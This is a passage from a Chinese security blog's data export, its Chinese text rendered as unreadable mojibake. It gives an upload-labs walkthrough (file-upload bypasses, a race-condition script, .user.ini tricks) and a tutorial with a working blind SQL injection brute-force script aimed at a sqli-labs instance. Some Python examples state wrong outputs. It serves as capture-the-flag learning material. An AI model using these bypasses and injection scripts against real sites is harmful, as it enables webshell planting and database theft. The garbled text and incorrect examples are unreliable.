&#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;; &#125;&#125; è¿™é‡ŒäºŒæ¬¡æ¸²æŸ“ç”¨åˆ°äº†å‡ ä¸ªå’Œimagecreatæœ‰å…³çš„å‡½æ•°ï¼Œä¾‹å¦‚imagecreatefromgif()ï¼Œä½œç”¨å°±æ˜¯åˆ›å»ºä¸€ä¸ªç”»å¸ƒï¼Œå¹¶ä»GIFæ–‡ä»¶æˆ–URLåœ°å€ä¸­è½½å…¥ä¸€å‰¯å›¾åƒã€‚æ¸²æŸ“åçš„å›¾åƒåˆ©ç”¨move_uploaded_file()å°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®ä¸‹ï¼Œæœ€åç”¨unlink()åˆ é™¤åŸæ–‡ä»¶ã€‚ å…³äºè¿™å…³çš„å†™å…¥æ–¹æ³•ï¼Œç”±äºgifæ–‡ä»¶åœ¨äºŒæ¬¡æ¸²æŸ“ä¹‹åä¼šä¿ç•™ä¸€æ®µå’Œæ¸²æŸ“å‰ç›¸åŒçš„å†…å®¹ï¼Œè€Œjpgä¸pngåˆ™æ²¡æœ‰è¿™æ®µå†…å®¹ã€‚å› æ­¤æˆ‘ä»¬é€‰æ‹©gifæ–‡ä»¶ï¼Œå°†æœ¨é©¬å†™å…¥æ¸²æŸ“å‰åå†…å®¹ä¸€è‡´çš„éƒ¨åˆ†ä¸­ï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è§£é¢˜å°±å¯ä»¥äº†ã€‚ Pass-18è¿™é‡Œæ¶‰åŠåˆ°äº†æ–‡ä»¶ä¸Šä¼ çš„ç«äº‰æ¡ä»¶ï¼Œ2020å¹´çš„é»‘ç›¾æ¯å°±æœ‰è¿™ä¸ªè€ƒç‚¹ã€‚æç¤ºè¯´è¿™é¢˜éœ€è¦ä»£ç å®¡è®¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åˆ†æä»£ç ï¼š 1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125;&#125; åˆ†æä»£ç ï¼Œè¿™é‡Œç¨‹åºç”¨move_uploaded_file()å¯¹æ–‡ä»¶è¿›è¡Œè½¬å­˜åè¯»å–åç¼€å¹¶è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœåç¼€ä¸ä¸º.jpg|.png|.gifçš„è¯åˆ™ä½¿ç”¨unlinkå‡½æ•°åˆ é™¤æ–‡ä»¶ã€‚è€Œæ¡ä»¶ç«äº‰æ¼æ´å°±è¿ç”¨åˆ°äº†åœ¨å¤šçº¿ç¨‹æƒ…å†µä¸‹ï¼Œå°±æœ‰å¯èƒ½å‡ºç°è¿˜æ²¡å¤„ç†å®Œï¼Œæˆ‘ä»¬å°±è®¿é—®äº†åŸæ–‡ä»¶ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´é˜²æŠ¤è¢«ç»•è¿‡ã€‚ ç½‘ç«™å…è®¸ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œç„¶åæ£€æŸ¥ä¸Šä¼ æ–‡ä»¶æ˜¯å¦åŒ…å«webshell,å¦‚æœåŒ…å«åˆ é™¤è¯¥æ–‡ä»¶ï¼Œæˆ–è€…ç½‘ç«™å…è®¸ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œä½†æ˜¯å¦‚æœä¸æ˜¯æŒ‡å®šç±»å‹ï¼Œé‚£ä¹ˆä½¿ç”¨unlinkåˆ é™¤æ–‡ä»¶ï¼Œåœ¨ç±»ä¼¼è¿™ä¸¤ç§æƒ…å†µä¸‹æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘ä½¿ç”¨ç«äº‰æ¡ä»¶æ¼æ´è§£é¢˜ã€‚ é‚£ä¹ˆæˆ‘ä»¬è¦æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®è®¿é—®æ–‡ä»¶å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯çˆ†ç ´ä¸Šä¼ ã€‚ä½¿ç”¨burp suiteè¥é€ å¾ˆå¤šäººä¸Šä¼ info.phpï¼ˆ&lt;?php phpinfo();?&gt;ï¼‰çš„åœºæ™¯ï¼ŒåŒæ—¶æˆ‘ä»¬ç”¨èšå‰‘è¿æ¥ï¼Œä¸‹é¢æ˜¯å…·ä½“æµç¨‹ï¼šé¦–å…ˆæˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶å¹¶æŠ“åŒ…ï¼Œå°†æŠ“åŒ…å†…å®¹å‘é€åˆ°Intruderä¸­ï¼Œéšæ„æ„å»ºä¸€ä¸ªpayloadçˆ†ç ´ç‚¹ï¼Œä¾‹å¦‚æˆ‘é€‰å®šGETä¸­çš„actionå†…å®¹è¿›è¡Œçˆ†ç ´ï¼Œè®¾ç½®å­—å…¸ä¸º1-9999çš„æ•°å­—ï¼Œè®¾ç½®10çº¿ç¨‹ã€‚ è®¾ç½®å®Œä¹‹åè¿›è¡Œæ”»å‡»ï¼Œåœ¨æ”»å‡»çš„åŒæ—¶ä¸æ–­è®¿é—®127.0.0.1/upload/info.phpï¼Œå°†phpinfoçš„é¡µé¢åˆ·æ–°å‡ºæ¥ååœ¨uploadæ–‡ä»¶å¤¹ä¸­å°±å¯ä»¥å‘ç°info.phpä¹ŸæˆåŠŸä¸Šä¼ ã€‚ Pass-19è¿™å…³åŒæ ·ä¹Ÿæ˜¯ç«äº‰æ¡ä»¶æ¼æ´ï¼Œä¸è¿‡è¿™å…³é™¤äº†æ£€æµ‹åç¼€ï¼Œè¿˜æ£€æµ‹äº†æ–‡ä»¶å¤§å°ã€æ–‡ä»¶åæ˜¯å¦é‡å¤ã€ç›®å½•æ˜¯å¦å¯å†™ç­‰ç­‰ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åï¼Œå¯¹æ–‡ä»¶é‡æ–°å‘½åã€‚æœ¬å…³ä¸Šä¼ å›¾ç‰‡ç ç„¶åç”¨æ–‡ä»¶åŒ…å«ä¼ªåè®®è¯»å–å³å¯ã€‚è¿™å‘Šè¯‰æˆ‘ä»¬ï¼Œåªè¦æˆ‘ä»¬è®¿é—®çš„å¤Ÿå¿«ï¼Œç¨‹åºå°±æ¥ä¸åŠé‡å‘½åæˆ‘ä»¬çš„æ–‡ä»¶ã€‚ æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªpythonè„šæœ¬å¸®åŠ©æˆ‘ä»¬è¯»å–æ–‡ä»¶ï¼š 123456789import requestsurl = &quot;http://127.0.0.1/upload/include.php?info.jpg&quot;while True: r = requests.get(url) if &quot;phpinfo&quot; in r.text: print(&quot;OK&quot;) break else: print(&quot;NO&quot;) è·‘åˆ°è„šæœ¬å‡ºç°OKåå°±æˆåŠŸäº†ã€‚ Pass-20æœ¬å…³åˆä¸€æ¬¡ç”¨åˆ°äº†move_uploaded_file()ï¼Œè€Œä¸”æ˜¯ç”±POSTæ–¹å¼è·å–æ–‡ä»¶ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨13å…³çš„è¿‡å…³æ–¹å¼ï¼š%00æˆªæ–­ï¼Œæ›´æ”¹Hexä¸­çš„åå…­è¿›åˆ¶ç å³å¯ã€‚ æˆ‘ä»¬æ¥çœ‹çœ‹æœ¬å…³çš„æºç ï¼š 12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#x27;save_name&#x27;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125;else&#123; $msg = &#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; è¿™å…³æ£€éªŒçš„æ˜¯é»‘åå•ï¼Œå¦‚æœåç¼€ä¸é»‘åå•çš„å†…å®¹ä¸€è‡´åˆ™ç¦æ­¢ä¿å­˜ï¼Œåä¹‹åˆ™ä»¥è®¾å®šçš„ä¿å­˜åç§°ä½œä¸ºæ–‡ä»¶åä¿å­˜ã€‚ä»‹ç»å¦ä¸€ä¸ªæ–¹æ³•ï¼Œè¿™é‡Œmove_uploaded_file()é™¤äº†%00æˆªæ–­ä¹‹å¤–ï¼Œè¿˜ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„/.ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ„å»ºæ–‡ä»¶åï¼š å‘ç°info.phpå·²ç»æˆåŠŸå†™å…¥uploadæ–‡ä»¶å¤¹ä¸­ã€‚ Pass-21è¿™é¢˜æ˜¯æ•°ç»„ç»•è¿‡ä¸/.ç»•è¿‡ç›¸ç»“åˆï¼Œæˆ‘ä»¬å®¡è®¡ä¸€éä»£ç ï¼š 12345678910111213$file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file));&#125;$ext = end($file);$allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;;&#125;else&#123;$file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];$img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; æˆ‘ä»¬æ³¨æ„åˆ°è¿™æ®µä»£ç ä¸­æœ‰ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼Œå¦‚æœ$fileä¸ä¸ºæ•°ç»„åˆ™è¿›è¡Œç™½åå•æ£€æµ‹ï¼Œå¦åˆ™ä¸æ£€æµ‹ã€‚åŒæ—¶å‘ç°$file_nameç»è¿‡reset($file) . &#39;.&#39; . $file[count($file) - 1];å¤„ç†,å¦‚æœä¸Šä¼ çš„æ˜¯æ•°ç»„çš„è¯ï¼Œä¼šè·³è¿‡$file = explode(&#39;.&#39;, strtolower($file));ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®©$fileä¸ºæ•°ç»„ï¼š é¦–å…ˆç»•è¿‡MINEï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯è®©æ–‡ä»¶æˆåŠŸå‘½åä¸ºinfo.php/ï¼Œå¹¶é€šè¿‡move_uploaded_file()å‡ºå»/.ã€‚è€Œå‘½åçš„è§„åˆ™ä¸º$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];ï¼Œå› æ­¤æˆ‘ä»¬è¦è®©reset($file)è¿”å›info.php/ï¼Œ$file[count($file) - 1]è¿”å›ç©ºå€¼ï¼Œå³$file[0]ä¸ºsmi1e.php/ï¼Œ$file[2]ä¸ºç™½åå•ä¸­çš„jpgç”¨äºç»•è¿‡è¿‡æ»¤ã€‚è¿™æ ·å°±æˆåŠŸç»•è¿‡äº†è¿‡æ»¤ã€‚ ä½†æ˜¯è¿™ä¸ªçœ‹ç€çœŸçš„å¾ˆç»•ï¼Œä¹Ÿå¾ˆéš¾å½»åº•ç†è§£ï¼Œè¿™é‡Œä¹Ÿå°±ç†è§£äº†ä¸ªå¤§æ¦‚ï¼Œå…·ä½“åŸç†è¿˜è¦ç»§ç»­æ·±å…¥ç ”ç©¶ã€‚ .user.iniåœ¨ä¹‹å‰çš„å…³å¡ä¸­ï¼Œæˆ‘ä»¬ç”¨åˆ°äº†.htaccessæ–‡ä»¶ï¼Œä½†æ˜¯è¿™ä¸ªæ–‡ä»¶çš„ä½¿ç”¨æ˜¯æœ‰å±€é™æ€§çš„ï¼Œåªæœ‰åœ¨apacheæœåŠ¡å™¨ç¯å¢ƒä¸‹æ‰å¯ä»¥ä½¿ç”¨ã€‚å› æ­¤è¿™é‡Œè¡¥å……ä¸€ä¸ªç»•è¿‡æ–¹æ³•ï¼šä¸Šä¼ .user.iniæ–‡ä»¶ã€‚ åªè¦æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºphpï¼Œå¯¹åº”ç›®å½•ä¸‹æœ‰å¯ç”¨phpæ–‡ä»¶ï¼ŒæœåŠ¡å™¨ä½¿ç”¨CGI/FastCGIæ¨¡å¼ï¼Œå°±å¯ä»¥é€šè¿‡ä¸Šä¼ .user.iniç»•è¿‡é»‘åå•æ£€éªŒï¼š é¦–å…ˆæ„å»º.user.iniæ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š 1auto_prepend_file=a.jpg //ä¸ºäº†ç»•è¿‡è¿‡æ»¤éœ€è¦æ·»åŠ ä¾‹å¦‚jpgçš„æ–‡ä»¶å¤´ ç„¶åä¾æ¬¡ä¸Šä¼ .uesr.iniå’Œå›¾ç‰‡ç ï¼Œå›¾ç‰‡ä¾¿ä¼šè¢«è§£ææˆphpæ–‡ä»¶ æ€»ç»“ç³»ç»Ÿåœ°åˆ·å®Œäº†upload-labsï¼Œå­¦ä¹ äº†æ–‡ä»¶ä¸Šä¼ çš„å„ç§ç»•è¿‡å§¿åŠ¿ï¼š MINEç»•è¿‡ æ›´æ”¹åç¼€ï¼ˆ&#39;.php. .&#39;&#39;.phP&#39;&#39;.phtml&#39;&#39;.php &#39;&#39;.php.&#39;ç­‰ç­‰ï¼‰ ä¸Šä¼ .htaccessæˆ–.user.iniæ–‡ä»¶ ç«äº‰æ¡ä»¶ ä¸Šä¼ å›¾ç‰‡ç  %00æˆªæ–­ /.æˆªæ–­ åŒæ—¶è¿™ä¸ªé¶åœºä¹Ÿé”»ç‚¼äº†ä»£ç å®¡è®¡èƒ½åŠ›ï¼Œè¿˜æ˜¯å¾ˆæœ‰æ”¶è·çš„ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"pythonç›²æ³¨è„šæœ¬ç¼–å†™","slug":"pythonç›²æ³¨è„šæœ¬ç¼–å†™","date":"2021-11-19T04:47:02.000Z","updated":"2021-11-19T13:53:36.147Z","comments":true,"path":"2021/11/19/pythonç›²æ³¨è„šæœ¬ç¼–å†™/","link":"","permalink":"http://example.com/2021/11/19/python%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/","excerpt":"å‰è¨€ç›²æ³¨ä½œä¸ºsqlæ³¨å…¥æœ€å¸¸è§çš„è€ƒç‚¹ï¼ŒæŒæ¡è„šæœ¬çš„ç¼–å†™æ˜¯ååˆ†é‡è¦çš„ï¼Œç›²æ³¨è„šæœ¬åˆ†ä¸ºå¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨ï¼ŒåŒæ—¶è¿˜æœ‰å­—å…¸æ³•å’ŒäºŒåˆ†æ³•ã€‚","text":"å‰è¨€ç›²æ³¨ä½œä¸ºsqlæ³¨å…¥æœ€å¸¸è§çš„è€ƒç‚¹ï¼ŒæŒæ¡è„šæœ¬çš„ç¼–å†™æ˜¯ååˆ†é‡è¦çš„ï¼Œç›²æ³¨è„šæœ¬åˆ†ä¸ºå¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨ï¼ŒåŒæ—¶è¿˜æœ‰å­—å…¸æ³•å’ŒäºŒåˆ†æ³•ã€‚ ç¼–å†™è„šæœ¬å¸¸ç”¨çš„å‡½æ•°å…ˆä»‹ç»å‡ ä¸ªå†™è„šæœ¬æ—¶å¸¸ç”¨çš„pythonå‡½æ•°ã€‚ range()å‡½æ•°æ ¼å¼ä¸ºrange(start,stop[,step])ï¼Œåˆ†åˆ«è¡¨ç¤ºèµ·å§‹å€¼ï¼Œç»ˆæ­¢å€¼ä¸æ­¥é•¿ã€‚å¦‚æœä¸æŒ‡å®šstartå€¼åˆ™é»˜è®¤ä¸º0ï¼Œä¸æŒ‡å®šæ­¥é•¿åˆ™é»˜è®¤ä¸º1ï¼Œrange()çš„ä½œç”¨æ˜¯åˆ›å»ºä¸€ä¸ªæ•´æ•°åˆ—è¡¨ï¼ŒèŒƒå›´ä¸ºstart~(stop-1)ï¼Œä¸€èˆ¬ç”¨äºforå¾ªç¯ä¸­ã€‚ä¸‹é¢æä¾›å‡ ä¸ªä¾‹å­ï¼š 12345678for i in range(1,5): print(i)ç»“æœï¼š1 2 3 4for i in range(3): print(i)ç»“æœï¼š1 2 forå¾ªç¯å‡½æ•°æ ¼å¼ä¸ºfor iterating_var in sequence: statements(s)ï¼Œæ˜¯æˆ‘ä»¬ç¼–å†™è„šæœ¬çš„åŸºçŸ³ã€‚pythonä¸­çš„forå¾ªç¯å’Œcçš„forå¾ªç¯è¿˜æ˜¯æœ‰å¾ˆå¤§å·®åˆ«çš„ï¼Œpythonçš„forå¾ªç¯é¦–å…ˆå°†sequenceä¸­çš„ä¸€ä¸ªå€¼èµ‹å€¼ç»™iterating_varï¼Œç„¶åè¿›è¡Œå¾ªç¯è¯­å¥ï¼Œæ‰§è¡Œå®Œåç»§ç»­èµ‹å€¼æ‰§è¡Œï¼ŒçŸ¥é“æ‰€æœ‰å€¼éƒ½èµ‹ç»™äº†iterating_varä¸€éã€‚ä¸‹é¢æä¾›å‡ ä¸ªä¾‹å­ï¼š 1234567891011for i in &#x27;nihao&#x27;: print(&quot;%s&quot;% i)ç»“æœï¼šn i h a odic=[&#x27;union&#x27;,&#x27;ascii&#x27;,&#x27;long&#x27;]for i in dic: print(&#x27;%s&#x27;% dic)ç»“æœï¼šunion ascii long format()æ ¼å¼åŒ–å‡½æ•°ï¼Œé€šè¿‡&#123;&#125;å’Œ:æ¥æ„å»ºè¯­å¥ï¼Œç”¨formatå‡½æ•°ä¸­çš„å†…å®¹æ›¿ä»£å‰é¢{}ä¸­çš„å†…å®¹ã€‚format()å¯ä»¥æ¥å—ä¸é™ä¸ªå‚æ•°ï¼Œä½ç½®å¯ä»¥ä¸æŒ‰é¡ºåºã€‚ç›´æ¥ä¸Šå‡ ä¸ªä¾‹å­æ¥ç›´è§‚æ„Ÿå—ï¼ˆä¾‹å­å¼•ç”¨è‡ªèœé¸Ÿæ•™ç¨‹ï¼‰ï¼š 123456789101112131415161718192021222324&quot;&#123;&#125; &#123;&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;) # ä¸è®¾ç½®æŒ‡å®šä½ç½®ï¼ŒæŒ‰é»˜è®¤é¡ºåº&#x27;hello world&#x27; &quot;&#123;0&#125; &#123;1&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;) # è®¾ç½®æŒ‡å®šä½ç½®&#x27;hello world&#x27; &quot;&#123;1&#125; &#123;0&#125; &#123;1&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;) # è®¾ç½®æŒ‡å®šä½ç½®&#x27;world hello world&#x27;# è®¾ç½®å‚æ•°print(&quot;ç½‘ç«™åï¼š&#123;name&#125;, åœ°å€ &#123;url&#125;&quot;.format(name=&quot;èœé¸Ÿæ•™ç¨‹&quot;, url=&quot;www.runoob.com&quot;)) # é€šè¿‡å­—å…¸è®¾ç½®å‚æ•°site = &#123;&quot;name&quot;: &quot;èœé¸Ÿæ•™ç¨‹&quot;, &quot;url&quot;: &quot;www.runoob.com&quot;&#125;print(&quot;ç½‘ç«™åï¼š&#123;name&#125;, åœ°å€ &#123;url&#125;&quot;.format(**site)) # é€šè¿‡åˆ—è¡¨ç´¢å¼•è®¾ç½®å‚æ•°my_list = [&#x27;èœé¸Ÿæ•™ç¨‹&#x27;, &#x27;www.runoob.com&#x27;]print(&quot;ç½‘ç«™åï¼š&#123;0[0]&#125;, åœ°å€ &#123;0[1]&#125;&quot;.format(my_list)) # &quot;0&quot; æ˜¯å¿…é¡»çš„ä»¥ä¸Šä¸‰æ¡ç»“æœå‡ä¸ºï¼šç½‘ç«™åï¼šèœé¸Ÿæ•™ç¨‹, åœ°å€ www.runoob.com å½“ç„¶ä½¿ç”¨%è¿›è¡Œæ ¼å¼åŒ–ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¿™é‡Œä¹Ÿç»™ä¸€ä¸ªä¾‹å­ï¼š 12345params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot; % (1, 64)params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))&gt;64)^1&quot;# ä¸Šä¸¤å¼æ˜¯ç­‰ä»·çš„ requestsè¿›è¡ŒGETè¯·æ±‚æˆ–è€…POSTè¯·æ±‚æ¥è·å–é¡µé¢ï¼š 123r = requests.get(&#x27;url&#x27;) #getè¯·æ±‚r = requests.post(&#x27;url&#x27;ï¼Œdata=&#123;&#x27;key&#x27;=&#x27;value&#x27;&#125;) #postè¯·æ±‚ parmsparamså…³é”®å­—å‚æ•°å¯ä»¥ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²å­—å…¸æ¥æä¾›è¿™äº›å‚æ•°ã€‚æ–¹æ³•ç”³æ˜ä¸€ä¸ªparamså…³é”®å­—åï¼Œå°±ä¸å…è®¸åœ¨å…¶åé¢å†æœ‰ä»»ä½•å…¶ä»–å‚æ•°ã€‚è¿™é‡Œä¹Ÿç®€å•ç»™ä¸ªä¾‹å­ï¼š 1234payload=&#123;&quot;id&quot;: &quot;1&quot;&#125;r = requests.get(&quot;http://127.0.0.1&quot;,params=payload)ç»“æœï¼šhttp://127.0.0.1/?id=1 headersç”¨æ¥å°†å¤´æ–‡ä»¶å†™å…¥ï¼Œå¯¹äºcookieæ³¨å…¥ã€xffä¼ªé€ çš„é¢˜ç›®ç­‰éœ€è¦ç”¨åˆ° dataç”¨äºPOSTæ—¶å°†æ•°æ®ä¼ å…¥ã€‚ time.sleep()æ¨è¿Ÿè°ƒç”¨çº¿ç¨‹çš„è¿è¡Œï¼Œæ ¼å¼ä¸ºtime.sleep(sec),å¯ä»¥é€šè¿‡è®¾ç½®å‚æ•°secæ¥è°ƒæ•´ç§’æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ²¡æœ‰è¿”å›å€¼ã€‚ time.time()è¿”å›å½“å‰æ—¶é—´çš„æ—¶é—´æˆ³ï¼Œè¿™ä¸ªå‡½æ•°æ²¡æœ‰å‚æ•°ï¼Œç”¨äºæ—¶é—´ç›²æ³¨æ—¶ä½¿ç”¨ã€‚ æ³¨æ„äº‹é¡¹pythonä¸åƒcä¸€æ ·ä½¿ç”¨èŠ±æ‹¬å·å°†å‡½æ•°è¯­å¥æ‹¬èµ·ï¼Œå› æ­¤ç¼–å†™ç¨‹åºæ—¶å°¤å…¶è¦æ³¨æ„ä»£ç çš„ç¼©è¿›ï¼Œç›¸é‚»åŒç¼©è¿›çš„ä»£ç æ„å‘³ç€ä¸€å †ä»£ç å—ã€‚ å¸ƒå°”ç›²æ³¨è„šæœ¬ç›®å‰è®¤è¯†åˆ°çš„è„šæœ¬ä¸»è¦å°±ä¸¤ç§ï¼Œå­—å…¸æ³•ä¸äºŒåˆ†æ³•ã€‚åˆšå¥½è¿™æ¬¡åŸ¹è®­è¯¾éƒ½æœ‰ï¼Œæˆ‘å°±ç›´æ¥æ‹¿æ¥ç”¨ã€‚ é¦–å…ˆæ˜¯å­—å…¸çˆ†ç ´æ³•ï¼š 12345678910111213141516171819import requestsimport timedic = &quot;abcdefghijklmnopqrstuvwxyz1234567890_@&quot;flag = &quot;&quot;for i in range(1,20): for char in dic: url = &quot;http://e9ea91bf-1968-4779-b9aa-52f15b8ef793.node4.buuoj.cn/Less-8/?id=1&#x27;&quot; payload = &quot;and substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;.format(i,char) url = url + payload r=requests.get(url) time.sleep(0.05) if &quot;are&quot; in r.text: flag += char print(flag)print(flag) è¿™ä¸ªè„šæœ¬æ˜¯æ‹¿æ¥è·‘sqli-labs-less8çš„ï¼Œç”¨çš„æ˜¯buuçš„ç¯å¢ƒï¼Œè·‘çš„æ˜¯securityåº“ä¸­çš„è¡¨åã€‚è¿™ä¸ªè„šæœ¬è§£é‡Šä¸€ä¸‹å°±æ˜¯å°†dicçš„å†…å®¹ä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œå¦‚æœè¯•å‡ºæ¥é¡µé¢å›æ˜¾çš„å†…å®¹æœ‰ä¸€ä¸ªâ€œareâ€å°±è®°å½•åˆ°flagä¸­ï¼Œä¾æ¬¡æ‰“å°ï¼Œå¹¶åœ¨æœ€åå°†æœ€ç»ˆç»“æœæ‰“å°å‡ºæ¥ã€‚sleepå‡½æ•°æ˜¯ä¸ºäº†é™åˆ¶ç¨‹åºè¿è¡Œçš„é€Ÿåº¦ä»¥å…é€Ÿåº¦è¿‡å¿«å¯¼è‡´é¡µé¢ä¸ç¨³å®šæˆ–é‡å¤æ‰“å°ã€‚è€Œä¸”è¦æ³¨æ„ï¼Œè¿™ä¸ªæ–¹æ³•ä¸åŒºåˆ†å¤§å°å†™ã€‚ 